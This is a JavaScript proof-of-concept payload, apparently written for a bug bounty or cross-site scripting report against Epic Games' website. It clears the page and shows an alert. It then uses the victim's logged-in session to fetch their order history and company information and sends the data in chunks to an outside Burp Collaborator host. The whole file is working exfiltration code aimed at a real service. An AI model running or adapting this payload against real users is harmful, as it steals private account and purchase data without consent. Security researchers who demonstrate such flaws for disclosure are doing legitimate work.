(async () => {
  document.documentElement.innerHTML = "";
  document.body = document.createElement("body");
  document.body.style.cssText = "margin:0;padding:0;background:#fff;";

  alert("POC Example: Orders & Company Info Stolen");

  const collab = "https://ffyv5sxym8fbiwkpvkgkgjevvm1dp4tsi.oastify.com";

  async function fetchFull(url) {
    const res = await fetch(url, { credentials: "include" });
    if (!res.ok) throw new Error(`Failed: ${res.status}`);
    const reader = res.body.getReader();
    let chunks = [];
    let receivedLength = 0;
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      chunks.push(value);
      receivedLength += value.length;
    }
    let fullBody = new Uint8Array(receivedLength);
    let position = 0;
    for (let chunk of chunks) {
      fullBody.set(chunk, position);
      position += chunk.length;
    }
    return new TextDecoder("utf-8").decode(fullBody);
  }

  async function exfiltrate(label, data) {
    const chunkSize = 1900;
    for (let i = 0; i < data.length; i += chunkSize) {
      const part = data.slice(i, i + chunkSize);
      await fetch(`${collab}?label=${label}&data=${encodeURIComponent(part)}`);
    }
  }

  try {
    // Exfiltrate Order History
    const orders = await fetchFull(
      "https://www.epicgames.com/account/v2/payment/ajaxGetOrderHistory?sortDir=DESC&sortBy=DATE&locale=en-US"
    );
    await exfiltrate("orders", orders);
    console.log("Order history exfiltrated");

    // Exfiltrate Company Info
    const companyInfo = await fetchFull(
      "https://www.epicgames.com/account/v2/company-info"
    );
    await exfiltrate("company-info", companyInfo);
    console.log("Company info exfiltrated");

    console.log("All data sent to Burp Collaborator");
  } catch (error) {
    console.error("Error:", error);
  }
})();
